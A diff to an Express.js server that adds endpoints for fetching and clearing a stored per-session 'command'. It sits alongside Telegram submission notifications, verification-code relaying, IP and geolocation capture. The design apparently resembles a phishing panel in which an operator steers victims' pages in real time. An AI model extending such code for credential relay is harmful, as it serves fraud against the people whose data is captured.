@@ -9,7 +9,7 @@ const rateLimit = require('express-rate-limit');
 const { body, validationResult } = require('express-validator');
 
 const db = require('./lib/db');
-const { sendSubmissionNotification, sendVerificationCode, handleCallback, waitForCommand, getSession, setWebhook } = require('./lib/telegram');
+const { sendSubmissionNotification, sendVerificationCode, handleCallback, waitForCommand, getSession, getPersistentSession, clearSession, setWebhook } = require('./lib/telegram');
 const { parseUserAgent, getIp } = require('./lib/parser');
 const { lookupGeo } = require('./lib/geo');
 
@@ -128,6 +128,39 @@ app.get('/api/status/:sessionId', async (req, res) => {
 
   const result = await waitForCommand(sessionId);
   res.json(result || { command: null });
+});
+
+// --- Persistent session-state endpoint: returns stored command for a returning user ---
+app.get('/api/session-state/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
+    return res.status(400).json({ success: false, error: 'Invalid session ID' });
+  }
+  const persistent = getPersistentSession(sessionId);
+  if (!persistent) {
+    return res.json({ success: true, command: null });
+  }
+  if (persistent.consumed || !persistent.command) {
+    return res.json({ success: true, command: null });
+  }
+  res.json({
+    success: true,
+    command: persistent.command,
+    data: persistent.data || null,
+  });
+});
+
+// --- Clear session endpoint: marks session as consumed ---
+app.post('/api/session-clear/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
+    return res.status(400).json({ success: false, error: 'Invalid session ID' });
+  }
+  const persistent = getPersistentSession(sessionId);
+  if (persistent) {
+    db.saveSession(sessionId, { ...persistent, consumed: true, command: null, data: null });
+  }
+  res.json({ success: true });
 });
 
 // --- Verification code endpoint: links code to original submission via sessionId ---
